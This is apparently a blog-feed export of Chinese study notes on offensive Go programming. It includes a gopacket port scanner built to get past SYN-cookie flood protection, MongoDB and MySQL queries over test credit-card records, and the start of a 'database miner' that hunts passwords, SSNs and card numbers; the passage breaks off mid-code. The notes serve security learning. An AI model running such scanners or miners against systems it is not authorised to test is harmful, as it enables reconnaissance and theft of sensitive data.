id="通过SYN泛洪保护进行端口扫描"><a href="#通过SYN泛洪保护进行端口扫描" class="headerlink" title="通过SYN泛洪保护进行端口扫描"></a>通过SYN泛洪保护进行端口扫描</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><ul><li>某些情况下，扫描器会产生不正确的结果。<ul><li>例如：当目标使用SYN泛洪保护时，通常所有打开、关闭和过滤的端口都会产生相同的包交换，来表明该端口处于opening，这些保护被称为SYN cookie。可以防止SYN泛洪攻击，<strong>模糊</strong>攻击者，产生误报</li></ul></li><li>那么在目标使用SYN泛洪保护时，如何确定服务是在监听端口，还是设备错误的显示端口opening<ul><li>在这两种情况下，<strong>TCP三次握手均完成</strong>，大多数扫描工具(包括Nmap)都会查看这个序列(或它的变体，取决扫描类型)来确定端口状态。因此很可能会误报</li></ul></li></ul><h5 id="检查TCP标志位"><a href="#检查TCP标志位" class="headerlink" title="检查TCP标志位"></a>检查TCP标志位</h5><ul><li>若考虑到SYN cookie，则必须<strong>拓展端口扫描</strong>功能，通过检查连接建立后是否从目标接收到其他数据包来超越三次握手。</li><li>要实现这点：可以通过嗅探数据包查看是否有任何数据包使用附加的、合法服务通信的TCP标志位的值<strong>标识</strong>进行传输</li><li>TCP标志位表示有关数据包传输状态的信息。如果查看TCP规范，就会发现这些标志位存储在数据包报头的第14个字节中。该字节的每一位代表一个标志位的值。如果该位置的位是1，则标记为on；如果是0，则标记为off。下表显示了根据TCP规范，标志位在字节中的位置。</li></ul><table><thead><tr><th>位</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th><th></th></tr></thead><tbody><tr><td>标记</td><td>CWR</td><td>ECE</td><td>URG</td><td><strong>ACK</strong></td><td><strong>PSH</strong></td><td>RST</td><td><strong>SYN</strong></td><td><strong>FIN</strong></td><td></td></tr></tbody></table><ul><li>知道了所关心的标志位的位置后，可以创建一个过滤器来检查。</li><li>例如，可以查找包含一下标志位的数据包，这些标志位可能表示监听服务<ul><li>ACK和FIN</li><li>ACK</li><li>ACK和PSH</li></ul></li></ul><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;strings&quot;</span></span><br><span class="line">   <span class="string">&quot;time&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ( <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   <span class="comment">//接口名称(在下面main函数中命令行读取)</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">320</span>)                                              <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">true</span>                                                    <span class="comment">//是否以混杂模式运行 true</span></span><br><span class="line">   timeout  = pcap.BlockForever                                       <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] == 0x18&quot;</span> <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>                                                   <span class="comment">//是否找到</span></span><br><span class="line">   results  = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)                                    <span class="comment">//结果存储映射</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**** 接收要测试的接口名称和目标IP ****/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">capture</span><span class="params">(iface, target <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout) <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123; <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType()) <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   fmt.Println(<span class="string">&quot;Capturing packets&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123; <span class="comment">//4.读取数据包</span></span><br><span class="line">      networkLayer := packet.NetworkLayer() <span class="comment">//5.通过检查packet.NetworkLayer()的响应值来确定是否存在网络层</span></span><br><span class="line">      <span class="keyword">if</span> networkLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      transportLayer := packet.TransportLayer() <span class="comment">//5.通过检查packet.TransportLayer()的响应值来确定是否存在传输层</span></span><br><span class="line">      <span class="keyword">if</span> transportLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果上面两个层中有任何一个不存在，就忽略该数据包</span></span><br><span class="line">      <span class="comment">//这是因为没有传输层和网络层，下面的代码就不会拿到这些信息。</span></span><br><span class="line">      srcHost := networkLayer.NetworkFlow().Src().String()     <span class="comment">//ip</span></span><br><span class="line">      srcPort := transportLayer.TransportFlow().Src().String() <span class="comment">//port</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> srcHost != target &#123; <span class="comment">//6.判断是否命中目标</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      results[srcPort] += <span class="number">1</span> <span class="comment">//命中目标，增加端口开发的置信度级别</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">4</span> &#123; <span class="comment">//命令行参数</span></span><br><span class="line">      log.Fatalln(<span class="string">&quot;Usage: main.go &lt;capture_iface&gt; &lt;target_ip&gt; &lt;port1,port2,port3&gt;&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//1.查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   iface := os.Args[<span class="number">1</span>]              <span class="comment">//设备名称</span></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123; <span class="comment">//2.检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span> <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123; <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ip := os.Args[<span class="number">2</span>] <span class="comment">//目标ip</span></span><br><span class="line">   <span class="comment">/* 使用goroutine去报数据包捕获和处理逻辑并发运行，不会产生阻塞 */</span></span><br><span class="line">   <span class="keyword">go</span> capture(iface, ip)       <span class="comment">//3.接受要测试接口名称和目标IP</span></span><br><span class="line">   time.Sleep(<span class="number">1</span> * time.Second) <span class="comment">//延时，目的是确保留出足够多的时间设置嗅探器和处理数据包</span></span><br><span class="line"></span><br><span class="line">   ports, err := explode(os.Args[<span class="number">3</span>]) <span class="comment">//将命令行输入的端口放入数组</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> ports &#123; <span class="comment">//4.遍历所有端口</span></span><br><span class="line">      target := fmt.Sprintf(<span class="string">&quot;%s:%s&quot;</span>, ip, port)</span><br><span class="line">      fmt.Println(<span class="string">&quot;Trying&quot;</span>, target)</span><br><span class="line">      c, err := net.DialTimeout(<span class="string">&quot;tcp&quot;</span>, target, <span class="number">1000</span>*time.Millisecond) <span class="comment">//连接测试</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      c.Close() <span class="comment">//tcp连接后要断开</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/*time.Sleep()的多次调用：目的是确保留出足够多的时间设置嗅探器和处理数据包*/</span></span><br><span class="line">   time.Sleep(<span class="number">2</span> * time.Second) <span class="comment">//延时，目的是确保留出足够多的时间设置嗅探器和处理数据包</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 尝试李连杰每个端口后，仅显示置信度&gt;=1的端口。这意味着至少一个数据包与该端口的过滤器匹配 */</span></span><br><span class="line">   <span class="keyword">for</span> port, confidence := <span class="keyword">range</span> results &#123; <span class="comment">//</span></span><br><span class="line">      <span class="keyword">if</span> confidence &gt;= <span class="number">1</span> &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;Port %s open (confidence: %d)\n&quot;</span>, port, confidence)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">explode</span><span class="params">(portString <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   ret := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   ports := strings.Split(portString, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      port := strings.TrimSpace(port)</span><br><span class="line">      ret = <span class="built_in">append</span>(ret, port)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：这里我引用了书中的运行结果和需要改进的地方；提醒自己空闲时间去改进一下。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201121149796.png" alt="image-20230201121149796"></p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.1连接和查询数据库</title>
      <link href="/2023/02/01/Go/7.1%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2023/02/01/Go/7.1%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h4 id="1-安装MongoDB数据库然后写入数据"><a href="#1-安装MongoDB数据库然后写入数据" class="headerlink" title="1.安装MongoDB数据库然后写入数据"></a>1.安装<code>MongoDB</code>数据库然后写入数据</h4><ul><li>MongoDB是<code>NOSQL</code>数据库，他与其他传统数据库不同，是无架构的。</li><li>使用docker开启了之后，使用<code>store</code>数据库</li></ul><blockquote><p>db.use strore</p></blockquote><ul><li>写入数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db.transactions.insert([</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4444333322221111&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-05&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">100.12</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;1234&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;09/2020&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4444123456789012&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-07&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">2400.18</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;5544&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;02/2021&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4465122334455667&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-29&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">1450.87</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;9876&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;06/2020&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h4 id="2-下载包并写入代码"><a href="#2-下载包并写入代码" class="headerlink" title="2. 下载包并写入代码"></a>2. 下载包并写入代码</h4><ul><li>需要先下载包，因为官方没有与<code>NoSQL</code>直接交互的包，所以我们安装如下mongo的驱动：<code>go get gopkg.in/mgo.v2</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">CCNum      <span class="type">string</span>  <span class="string">`bson:&quot;ccnum&quot;`</span></span><br><span class="line">Date       <span class="type">string</span>  <span class="string">`bson:&quot;date&quot;`</span></span><br><span class="line">Amount     <span class="type">float32</span> <span class="string">`bson:&quot;amount&quot;`</span></span><br><span class="line">Cvv        <span class="type">string</span>  <span class="string">`bson:&quot;cvv&quot;`</span></span><br><span class="line">Expiration <span class="type">string</span>  <span class="string">`bson:&quot;exp&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">session, err := mgo.Dial(<span class="string">&quot;192.168.68.137&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">results := <span class="built_in">make</span>([]Transaction, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err := session.DB(<span class="string">&quot;store&quot;</span>).C(<span class="string">&quot;transactions&quot;</span>).Find(<span class="literal">nil</span>).All(&amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, txn := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="1-创建mysql-数据库，并且写入数据"><a href="#1-创建mysql-数据库，并且写入数据" class="headerlink" title="1.创建mysql 数据库，并且写入数据"></a>1.创建mysql 数据库，并且写入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>PLAINTEXT</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> database store;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span>  transactions(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ccnum <span class="type">varchar</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="type">date</span> <span class="type">date</span>,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> amount <span class="type">decimal</span>(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> cvv <span class="type">char</span>(<span class="number">4</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> exp <span class="type">date</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444333322221111&#x27;</span>, <span class="string">&#x27;2019-01-05&#x27;</span>, <span class="number">100.12</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;2020-09-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444123456789012&#x27;</span>, <span class="string">&#x27;2019-01-07&#x27;</span>, <span class="number">2400.18</span>, <span class="string">&#x27;5544&#x27;</span>, <span class="string">&#x27;2021-02-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4465122334455667&#x27;</span>, <span class="string">&#x27;2019-01-29&#x27;</span>, <span class="number">1450.87</span>, <span class="string">&#x27;9876&#x27;</span>, <span class="string">&#x27;2020-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h3><p><code>Go</code>包包含了一个<code>database/sql</code>的标准包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/<span class="keyword">go</span>-sql-driver/mysql</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">db,err := sql.Open(<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;root:root@tcp(127.0.0.1:3306)/store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ccnum,date,cvv,exp <span class="type">string</span></span><br><span class="line">amount  <span class="type">float32</span></span><br><span class="line">)</span><br><span class="line">rows,err := db.Query(<span class="string">&quot;SELECT ccnum,date,amount,cvv,exp FROM transactions &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">err := rows.Scan(&amp;ccnum,&amp;date,&amp;amount,&amp;cvv,&amp;exp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ccnum,date,cvv,exp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rows.Err() != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><ul><li>使用不同的后端数据库仅需要对代码进行以下较小的改动<ol><li>导入正确的数据库驱动程序</li><li>更改传递给sql.Open()的参数</li><li>根据后端数据库类型调整SQL语法</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.2数据库矿工</title>
      <link href="/2023/02/01/Go/7.2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%BF%E5%B7%A5/"/>
      <url>/2023/02/01/Go/7.2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%BF%E5%B7%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>假设攻击者想要查找密码、散列值、社会保险号和信用卡号。</li><li>与其构建一个挖掘各种后端数据库的单一实用程序</li><li>不如为每个数据库创建一个单独的使用程序。并实现一个定义好的接口，以确保实现之间的一致性</li><li>对于本例而言，这种灵活性可能很难达到，但我们可以重用和代码移植</li></ul><h4 id="1-首先实现一个接口-dbminer-go"><a href="#1-首先实现一个接口-dbminer-go" class="headerlink" title="1. 首先实现一个接口(dbminer.go)"></a>1. 首先实现一个接口(dbminer.go)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseMiner <span class="keyword">interface</span> &#123;  <span class="comment">//定义接口DatabaseMiner</span></span><br><span class="line">GetSchema() (*Schema, <span class="type">error</span>)   <span class="comment">//接口方法，不同数据库有不同的检索模式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Schema <span class="keyword">struct</span> &#123;   <span class="comment">//库集</span></span><br><span class="line">Databases []Database   <span class="comment">//定义一个数据库类型Database。该类型由子类型构成</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">struct</span> &#123;  <span class="comment">//表集</span></span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Tables []Table</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">struct</span> &#123;  <span class="comment">//列集</span></span><br><span class="line">Name    <span class="type">string</span></span><br><span class="line">Columns []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(m DatabaseMiner)</span></span> <span class="type">error</span> &#123;    <span class="comment">//关键逻辑</span></span><br><span 